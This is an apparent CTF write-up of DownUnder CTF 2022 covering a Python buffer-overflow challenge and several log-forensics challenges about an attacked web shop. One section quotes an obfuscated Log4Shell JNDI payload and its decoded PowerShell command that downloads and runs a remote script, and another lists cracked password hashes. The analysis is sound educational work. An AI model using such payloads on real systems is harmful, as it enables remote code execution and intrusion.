---
weight: 1
title: "DownUnder CTF 2022"
date: 2022-09-23
lastmod: 2022-09-25
draft: false
author: "Xenonminer"
authorLink: "https://xenonminer.github.io"
description: "writeup for challenges in downunder ctf 2022"

tags: ["pwn", "rev", "dfir"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---

- [https://ctftime.org/event/1625](https://ctftime.org/event/1625)
- Sep 23 to Sep 25
- Played with wackers
- Ranking: 392/1407 with 750 points

# My Solves/Writeups

## Pwn

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| pwn/babyp(y)wn | beginner | 50 | [jump](#pwnbabypywn) |

## Rev

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| rev/source-provided | beginner | 50 | [jump](#revsource-provided) |

## DFIR

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| dfir/Shop-Knock-Knock-Knock | easy | 50 | [jump](#dfirshop-knock-knock-knock) |
| dfir/Shop-Logging-for-what? | easy | 50 | [jump](#dfirshop-logging-for-what) |
| dfir/Shop-I'm-just-looking! | easy | 50 | [jump](#dfirshop-im-just-looking) |
| dfir/Shop-Oi!-Get-out-of-there! | medium | 50 | [jump](#dfirshop-oi-get-out-of-there) |

## Writeups
### pwn/babypywn

Python is memory safe, right?

Author: joseph#8210

Attachments: [babypywn.py](https://play.duc.tf/files/75063ab9b30ed274dd69906496ce0c15/babypywn.py?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjozN30.YzHRZQ.fB3_7LN6wR9a1LOd2JRyUidbaC4)

### Solution

Downloading the python file and looking at it, I recognized this as a simple buffer overflow challenge but written in python.

The program was using the ctypes python library which allowes it to act like c.

It creates a buffer size for the input to stay in.
```py
buf1 = c_buffer(512)
buf2 = c_buffer(512)
```

The program is looking for the string "DUCTF" in the buffer of buf2 which means if we can just overflow 512 bytes of buf1 and add a DUCTF after, it should print the flag.

The alternative I used was just spamming DUCTF using python: ```python2 -c "print 'DUCTF'*200" | nc 2022.ductf.dev 30021```

```Flag: DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}```

### rev/source-provided

In this reversing challenge, source is provided.

Author: joseph#8210

Attachments: [chall](https://play.duc.tf/files/77264a4412dde0c22c878269e1fc9c11/chall?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo1N30.YzHR2Q.ocJkP7Re57zZU4nVaGuD10gK4ec)
[chall.S](https://play.duc.tf/files/2c136d630abb9d5d25109c2b6424cc5e/chall.S?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo1OH0.YzHSag.bHrtRmikcYkKQA7n4ZRreyj3UT8)

### Solution



### dfir/shop-knock-knock-knock

Looks like there's been a bruteforce/password spray attempt against the website!

What's the contact email for the ISP of the attacker's IP?

Flag format: Email address, case insensitive

Author: Cake#4096

Attachments: [DownUnderShop.JSON](https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI)

### Solution

```Although this had the most solves, it was the weidest/ hardest one for me.```

Looking at the file, we see that there are many different payloads sent to the web server that are of form jndi:smth//

Searching up on google for jndi it returns results of the log4shell attack that happened last year

```The ip can also be found from looking at the password change attempts```

We know that these attacks are hacker attacks, so looking at the ip associated with the attack payload we can find the ISP of the attacker ip by running whois on the ip.

After several results of emails we get the answer

Flag: ```abuse@telstra.net```

### dfir/shop-logging-for-what

We implemented a basic IPS to help protect our site from new attacks.

Somehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.

What is the name of the script that was run?

Flag format: Name of the script that was run, case sensitive.

Author: Conletz#5420

Attachments: [DownUnderShop.JSON](https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI)

### Solution

Knowing from the previous challenge that the attacks were log4shell attacks in the form of jndi:smth, we are probably looking for a version of the payload that can bypass a filter.

Scrolling through the file, we come across a payload that is also in the useragent section but looks obfuscated to bypass the filter.

`${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5le
GUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}`

The end of this payload looks like base64 so decrypt the base64

```powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');"```

This part felt kinda guessy to me but the answer for the script run was just the part after the link

```Flag: pTCNp5p6LP0d7qA77yvb4SHf40```

### dfir/shop-im-just-looking

We've seen some vulnerability scanning activity against us!

What was the name of the tool used?

Flag format: Name of the tool used, case insensitive

Author: Cake#4096

Attachments: [DownUnderShop.JSON](https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI)

### Solution

```This challenge felt even more guessy to me as I found the answer by trying to do the password challenge instead.```

Searching through the json file during the password challenge of this file, I was looking for some wordlist that I could maybe use to crack the hashes.

Grepping txt from the json file, I got the result of nuclei.txt.

I searched up nuclei.txt on google thinking I could download this wordlist and use it to crack the hashes but when I searched it up, I instead find a vulnerability scanner on github called nuclei. [nuclei](https://github.com/projectdiscovery/nuclei)

This challenge description was asking for a vulnerability scanner, so nuclei seemed fit and it ended up being the flag.

```Flag: nuclei```

### dfir/shop-oi-get-out-of-there

Someone was able to successfully break into the admin account!

Do you know what the old password was?

Flag format: The password, case insensitive

Author: Cake#4096

Attachments: [DownUnderShop.JSON](https://play.duc.tf/files/93b83fc0ff46c9bd182b8afc39dd320e/DownUnderShop.JSON?token=eyJ1c2VyX2lkIjozNTUxLCJ0ZWFtX2lkIjoxNTQwLCJmaWxlX2lkIjo3MX0.YzMa_w.g9yOj7tPU6Oz6srTZeZB8Op2gOI)

### Solution

After searching through the files on the previous challenges, I realized that there were these weird links pointing to /changepassword and had base64 text after the ref query parameter.

Using grep to search for "ref" and grabbing all the base64 text and decoding the base64 returns some password-like text.

```
b506fb0cabb60e9f1132daa72df4d567:6d7c5b3e796d833b3fdd40f4ce57facd
2ac9cb7dc02b3c0083eb70898e549b63:6d7c5b3e796d833b3fdd40f4ce57facd
3dc919de186d1a8ee62fff92d80839f7:6d7c5b3e796d833b3fdd40f4ce57facd
7a581ac4d8cb3bfc596fce9afb115fd2:6d7c5b3e796d833b3fdd40f4ce57facd
```

At first I thought this was a LM:NTLM hash because of the ldap references in the json file but trying to crack using hashcat/ john didn't work.

After, I tried plugging the hashes into hashes.com (cracked website for cracking passwords), and it cracked all of the passwords.

```
2ac9cb7dc02b3c0083eb70898e549b63:Password1
3dc919de186d1a8ee62fff92d80839f7:ozzieozzieozzie
7a581ac4d8cb3bfc596fce9afb115fd2:downunder2
b506fb0cabb60e9f1132daa72df4d567:crackstation
```

Submitting each of the passwords, one of them worked.

```Flag: ozzieozzieozzie```
